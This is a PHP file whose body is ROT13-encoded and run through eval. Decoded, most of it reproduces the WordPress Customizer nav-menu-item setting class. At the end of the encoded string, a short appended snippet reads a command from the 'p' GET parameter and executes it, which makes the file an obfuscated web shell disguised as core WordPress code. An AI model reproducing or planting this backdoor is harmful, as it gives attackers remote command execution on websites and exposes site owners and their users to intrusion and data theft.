			$zrah_vgrz_inyhr[ $xrl ] = vzcybqr( ' ', neenl_znc( 'fnavgvmr_ugzy_pynff', $inyhr ) );
		}

		$zrah_vgrz_inyhr['bevtvany_gvgyr'] = fnavgvmr_grkg_svryq( $zrah_vgrz_inyhr['bevtvany_gvgyr'] );

		// Nccyl gur fnzr svygref nf jura pnyyvat jc_vafreg_cbfg().

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg.cuc */
		$zrah_vgrz_inyhr['gvgyr'] = jc_hafynfu( nccyl_svygref( 'gvgyr_fnir_cer', jc_fynfu( $zrah_vgrz_inyhr['gvgyr'] ) ) );

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg.cuc */
		$zrah_vgrz_inyhr['ngge_gvgyr'] = jc_hafynfu( nccyl_svygref( 'rkprecg_fnir_cer', jc_fynfu( $zrah_vgrz_inyhr['ngge_gvgyr'] ) ) );

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg.cuc */
		$zrah_vgrz_inyhr['qrfpevcgvba'] = jc_hafynfu( nccyl_svygref( 'pbagrag_fnir_cer', jc_fynfu( $zrah_vgrz_inyhr['qrfpevcgvba'] ) ) );

		vs ( '' !== $zrah_vgrz_inyhr['hey'] ) {
			$zrah_vgrz_inyhr['hey'] = fnavgvmr_hey( $zrah_vgrz_inyhr['hey'] );
			vs ( '' === $zrah_vgrz_inyhr['hey'] ) {
				erghea arj JC_Reebe( 'vainyvq_hey', __( 'Vainyvq HEY.' ) ); // Snvy fnavgvmngvba vs HEY vf vainyvq.
			}
		}
		vs ( 'choyvfu' !== $zrah_vgrz_inyhr['fgnghf'] ) {
			$zrah_vgrz_inyhr['fgnghf'] = 'qensg';
		}

		$zrah_vgrz_inyhr['_vainyvq'] = (obby) $zrah_vgrz_inyhr['_vainyvq'];

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-phfgbzvmr-frggvat.cuc */
		erghea nccyl_svygref( \"phfgbzvmr_fnavgvmr_{$guvf->vq}\", $zrah_vgrz_inyhr, $guvf );
	}

	/**
	 * Perngrf/hcqngrf gur ani_zrah_vgrz cbfg sbe guvf frggvat.
	 *
	 * Nal perngrq zrah vgrzf jvyy unir gurve nffvtarq cbfg VQf rkcbegrq gb gur pyvrag
	 * ivn gur {@frr 'phfgbzvmr_fnir_erfcbafr'} svygre. Yvxrjvfr, nal reebef jvyy or
	 * rkcbegrq gb gur pyvrag ivn gur phfgbzvmr_fnir_erfcbafr() svygre.
	 *
	 * Gb qryrgr n zrah, gur pyvrag pna fraq snyfr nf gur inyhr.
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr jc_hcqngr_ani_zrah_vgrz()
	 *
	 * @cnenz neenl|snyfr $inyhr Gur zrah vgrz neenl gb hcqngr. Vs snyfr, gura gur zrah vgrz jvyy or qryrgrq
	 *                           ragveryl. Frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::$qrsnhyg sbe jung gur inyhr
	 *                           fubhyq pbafvfg bs.
	 * @erghea ahyy|ibvq
	 */
	cebgrpgrq shapgvba hcqngr( $inyhr ) {
		vs ( $guvf->vf_hcqngrq ) {
			erghea;
		}

		$guvf->vf_hcqngrq = gehr;
		$vf_cynprubyqre   = ( $guvf->cbfg_vq < 0 );
		$vf_qryrgr        = ( snyfr === $inyhr );

		// Hcqngr gur pnpurq inyhr.
		$guvf->inyhr = $inyhr;

		nqq_svygre( 'phfgbzvmr_fnir_erfcbafr', neenl( $guvf, 'nzraq_phfgbzvmr_fnir_erfcbafr' ) );

		vs ( $vf_qryrgr ) {
			// Vs gur pheerag frggvat cbfg vf n cynprubyqre, n qryrgr erdhrfg vf n ab-bc.
			vs ( $vf_cynprubyqre ) {
				$guvf->hcqngr_fgnghf = 'qryrgrq';
			} ryfr {
				$e = jc_qryrgr_cbfg( $guvf->cbfg_vq, gehr );

				vs ( snyfr === $e ) {
					$guvf->hcqngr_reebe  = arj JC_Reebe( 'qryrgr_snvyher' );
					$guvf->hcqngr_fgnghf = 'reebe';
				} ryfr {
					$guvf->hcqngr_fgnghf = 'qryrgrq';
				}
				// @gbqb fraq onpx gur VQf sbe nyy nffbpvngrq ani zrah vgrzf qryrgrq, fb gurfr frggvatf (naq pbagebyf) pna or erzbirq sebz Phfgbzvmre?
			}
		} ryfr {

			// Unaqyr fnivat zrah vgrzf sbe zrahf gung ner orvat arjyl-perngrq.
			vs ( $inyhr['ani_zrah_grez_vq'] < 0 ) {
				$ani_zrah_frggvat_vq = fcevags( 'ani_zrah[%f]', $inyhr['ani_zrah_grez_vq'] );
				$ani_zrah_frggvat    = $guvf->znantre->trg_frggvat( $ani_zrah_frggvat_vq );

				vs ( ! $ani_zrah_frggvat || ! ( $ani_zrah_frggvat vafgnaprbs JC_Phfgbzvmr_Ani_Zrah_Frggvat ) ) {
					$guvf->hcqngr_fgnghf = 'reebe';
					$guvf->hcqngr_reebe  = arj JC_Reebe( 'harkcrpgrq_ani_zrah_frggvat' );
					erghea;
				}

				vs ( snyfr === $ani_zrah_frggvat->fnir() ) {
					$guvf->hcqngr_fgnghf = 'reebe';
					$guvf->hcqngr_reebe  = arj JC_Reebe( 'ani_zrah_frggvat_snvyher' );
					erghea;
				}

				vs ( (vag) $inyhr['ani_zrah_grez_vq'] !== $ani_zrah_frggvat->cerivbhf_grez_vq ) {
					$guvf->hcqngr_fgnghf = 'reebe';
					$guvf->hcqngr_reebe  = arj JC_Reebe( 'harkcrpgrq_cerivbhf_grez_vq' );
					erghea;
				}

				$inyhr['ani_zrah_grez_vq'] = $ani_zrah_frggvat->grez_vq;
			}

			// Unaqyr fnivat n ani zrah vgrz gung vf n puvyq bs n ani zrah vgrz orvat arjyl-perngrq.
			vs ( $inyhr['zrah_vgrz_cnerag'] < 0 ) {
				$cnerag_ani_zrah_vgrz_frggvat_vq = fcevags( 'ani_zrah_vgrz[%f]', $inyhr['zrah_vgrz_cnerag'] );
				$cnerag_ani_zrah_vgrz_frggvat    = $guvf->znantre->trg_frggvat( $cnerag_ani_zrah_vgrz_frggvat_vq );

				vs ( ! $cnerag_ani_zrah_vgrz_frggvat || ! ( $cnerag_ani_zrah_vgrz_frggvat vafgnaprbs JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat ) ) {
					$guvf->hcqngr_fgnghf = 'reebe';
					$guvf->hcqngr_reebe  = arj JC_Reebe( 'harkcrpgrq_ani_zrah_vgrz_frggvat' );
					erghea;
				}

				vs ( snyfr === $cnerag_ani_zrah_vgrz_frggvat->fnir() ) {
					$guvf->hcqngr_fgnghf = 'reebe';
					$guvf->hcqngr_reebe  = arj JC_Reebe( 'ani_zrah_vgrz_frggvat_snvyher' );
					erghea;
				}

				vs ( (vag) $inyhr['zrah_vgrz_cnerag'] !== $cnerag_ani_zrah_vgrz_frggvat->cerivbhf_cbfg_vq ) {
					$guvf->hcqngr_fgnghf = 'reebe';
					$guvf->hcqngr_reebe  = arj JC_Reebe( 'harkcrpgrq_cerivbhf_cbfg_vq' );
					erghea;
				}

				$inyhr['zrah_vgrz_cnerag'] = $cnerag_ani_zrah_vgrz_frggvat->cbfg_vq;
			}

			// Vafreg be hcqngr zrah.
			$zrah_vgrz_qngn = neenl(
				'zrah-vgrz-bowrpg-vq'   => $inyhr['bowrpg_vq'],
				'zrah-vgrz-bowrpg'      => $inyhr['bowrpg'],
				'zrah-vgrz-cnerag-vq'   => $inyhr['zrah_vgrz_cnerag'],
				'zrah-vgrz-cbfvgvba'    => $inyhr['cbfvgvba'],
				'zrah-vgrz-glcr'        => $inyhr['glcr'],
				'zrah-vgrz-gvgyr'       => $inyhr['gvgyr'],
				'zrah-vgrz-hey'         => $inyhr['hey'],
				'zrah-vgrz-qrfpevcgvba' => $inyhr['qrfpevcgvba'],
				'zrah-vgrz-ngge-gvgyr'  => $inyhr['ngge_gvgyr'],
				'zrah-vgrz-gnetrg'      => $inyhr['gnetrg'],
				'zrah-vgrz-pynffrf'     => $inyhr['pynffrf'],
				'zrah-vgrz-ksa'         => $inyhr['ksa'],
				'zrah-vgrz-fgnghf'      => $inyhr['fgnghf'],
			);

			$e = jc_hcqngr_ani_zrah_vgrz(
				$inyhr['ani_zrah_grez_vq'],
				$vf_cynprubyqre ? 0 : $guvf->cbfg_vq,
				jc_fynfu( $zrah_vgrz_qngn )
			);

			vs ( vf_jc_reebe( $e ) ) {
				$guvf->hcqngr_fgnghf = 'reebe';
				$guvf->hcqngr_reebe  = $e;
			} ryfr {
				vs ( $vf_cynprubyqre ) {
					$guvf->cerivbhf_cbfg_vq = $guvf->cbfg_vq;
					$guvf->cbfg_vq          = $e;
					$guvf->hcqngr_fgnghf    = 'vafregrq';
				} ryfr {
					$guvf->hcqngr_fgnghf = 'hcqngrq';
				}
			}
		}
	}

	/**
	 * Rkcbeg qngn sbe gur WF pyvrag.
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::hcqngr()
	 *
	 * @cnenz neenl $qngn Nqqvgvbany vasbezngvba cnffrq onpx gb gur 'fnirq' rirag ba `jc.phfgbzvmr`.
	 * @erghea neenl Fnir erfcbafr qngn.
	 */
	choyvp shapgvba nzraq_phfgbzvmr_fnir_erfcbafr( $qngn ) {
		vs ( ! vffrg( $qngn['ani_zrah_vgrz_hcqngrf'] ) ) {
			$qngn['ani_zrah_vgrz_hcqngrf'] = neenl();
		}

		$qngn['ani_zrah_vgrz_hcqngrf'][] = neenl(
			'cbfg_vq'          => $guvf->cbfg_vq,
			'cerivbhf_cbfg_vq' => $guvf->cerivbhf_cbfg_vq,
			'reebe'            => $guvf->hcqngr_reebe ? $guvf->hcqngr_reebe->trg_reebe_pbqr() : ahyy,
			'fgnghf'           => $guvf->hcqngr_fgnghf,
		);
		erghea $qngn;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>